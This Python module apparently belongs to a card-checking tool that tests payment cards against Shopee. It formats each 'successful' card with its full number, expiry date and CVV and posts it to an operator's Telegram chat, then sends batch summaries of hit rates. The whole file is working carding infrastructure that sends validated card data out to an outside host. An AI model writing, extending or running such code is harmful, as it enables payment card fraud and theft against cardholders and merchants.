"""Telegram notification sender for successful card validations."""

from __future__ import annotations

import os
from datetime import datetime
from typing import Optional

import requests
from dotenv import load_dotenv

from utils.helpers import log_error, log_info


# Load environment variables
load_dotenv()

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"


def is_telegram_configured() -> bool:
    """Check if Telegram bot is properly configured."""
    return bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)


def format_card_message(card_data: str, result_message: str) -> str:
    """
    Format successful card data into a well-structured Telegram message.
    
    Args:
        card_data: Card data in format "number|month|year|cvv"
        result_message: Success message from Shopee
    
    Returns:
        Formatted HTML message for Telegram
    """
    try:
        parts = card_data.split("|")
        if len(parts) != 4:
            return _format_simple_message(card_data, result_message)
        
        card_number, month, year, cvv = parts
        
        # Mask card number (show first 6 and last 4 digits)
        if len(card_number) >= 10:
            masked_number = f"{card_number[:6]}{'*' * (len(card_number) - 10)}{card_number[-4:]}"
        else:
            masked_number = card_number
        
        # Get current timestamp
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Build message with HTML formatting
        message = (
            f"✅ <b>Card Validation Success</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💳 <b>Card Number:</b> <code>{card_number}</code>\n"
            f"🔒 <b>Masked:</b> <code>{masked_number}</code>\n"
            f"📅 <b>Expiry:</b> <code>{month}/{year}</code>\n"
            f"🔐 <b>CVV:</b> <code>{cvv}</code>\n\n"
            f"📝 <b>Response:</b>\n"
            f"<i>{result_message}</i>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🕒 <i>{timestamp}</i>"
        )
        
        return message
    except Exception as exc:
        log_error(f"Error formatting card message: {exc}")
        return _format_simple_message(card_data, result_message)


def _format_simple_message(card_data: str, result_message: str) -> str:
    """Fallback simple message format."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return (
        f"✅ <b>Card Validation Success</b>\n\n"
        f"<code>{card_data}</code>\n\n"
        f"<i>{result_message}</i>\n\n"
        f"🕒 <i>{timestamp}</i>"
    )


def send_telegram_notification(card_data: str, result_message: str) -> bool:
    """
    Send a Telegram notification for a successful card.
    
    Args:
        card_data: Card data in format "number|month|year|cvv"
        result_message: Success message from Shopee
    
    Returns:
        True if notification was sent successfully, False otherwise
    """
    if not is_telegram_configured():
        log_info("Telegram bot not configured. Skipping notification.")
        return False
    
    try:
        message = format_card_message(card_data, result_message)
        
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }
        
        response = requests.post(TELEGRAM_API_URL, json=payload, timeout=10)
        result = response.json()
        
        if result.get("ok"):
            log_info(f"✅ Telegram notification sent successfully (Message ID: {result.get('result', {}).get('message_id')})")
            return True
        else:
            error_description = result.get("description", "Unknown error")
            log_error(f"Failed to send Telegram notification: {error_description}")
            return False
    except requests.exceptions.Timeout:
        log_error("Telegram notification timeout after 10 seconds")
        return False
    except requests.exceptions.RequestException as exc:
        log_error(f"Network error sending Telegram notification: {exc}")
        return False
    except Exception as exc:
        log_error(f"Unexpected error sending Telegram notification: {exc}")
        return False


def send_batch_summary(total_checked: int, successful: int, failed: int, duration_seconds: float) -> bool:
    """
    Send a batch processing summary to Telegram.
    
    Args:
        total_checked: Total number of cards checked
        successful: Number of successful cards
        failed: Number of failed cards
        duration_seconds: Total processing time in seconds
    
    Returns:
        True if notification was sent successfully, False otherwise
    """
    if not is_telegram_configured():
        return False
    
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        success_rate = (successful / total_checked * 100) if total_checked > 0 else 0
        
        message = (
            f"📊 <b>Batch Processing Complete</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🔢 <b>Total Cards:</b> {total_checked}\n"
            f"✅ <b>Successful:</b> {successful}\n"
            f"❌ <b>Failed:</b> {failed}\n"
            f"📈 <b>Success Rate:</b> {success_rate:.1f}%\n"
            f"⏱️ <b>Duration:</b> {duration_seconds:.1f}s\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🕒 <i>{timestamp}</i>"
        )
        
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }
        
        response = requests.post(TELEGRAM_API_URL, json=payload, timeout=10)
        result = response.json()
        
        if result.get("ok"):
            log_info("✅ Batch summary sent to Telegram")
            return True
        else:
            log_error(f"Failed to send batch summary: {result.get('description', 'Unknown error')}")
            return False
    except Exception as exc:
        log_error(f"Error sending batch summary: {exc}")
        return False
